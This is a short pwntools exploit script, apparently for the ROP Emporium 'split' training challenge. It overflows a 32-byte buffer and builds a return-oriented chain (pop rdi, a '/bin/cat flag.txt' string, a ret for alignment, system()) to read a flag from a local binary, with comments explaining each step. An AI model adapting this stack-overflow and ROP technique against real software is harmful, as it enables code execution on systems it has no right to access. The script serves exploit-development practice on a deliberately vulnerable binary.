#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./split')
context.bits = 64

#libc = elf.libc
rop = ROP(elf)

gs = '''
continue
'''

def start():
    if args.GDB:
       return gdb.debug('./split', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#========= exploit here ===================

junk = b'A' * 32
rbp = b'B' * 8
poprdi = rop.rdi.address
binsh = next(elf.search(b'/bin/cat'))
system = elf.sym.system
ret = rop.ret.address

payload = junk
payload += rbp
#We control the return pointer

#We need to find address of pop rdi with command = ropper --file split --search 'pop rdi'
payload += p64(poprdi)  #the instruction pointer will jump to the address of pop rdi;ret
payload += p64(binsh)   #the stack pointer will point now to the address of /bin/cat flag.txt
payload += p64(ret)     #in ubuntu we have to add ret address to aline the stack
payload += p64(system)  #this function is useful because here there is a /bin/ls, and we're going to replace it

r.sendlineafter('>', payload)
#========= interactive ====================
r.interactive()
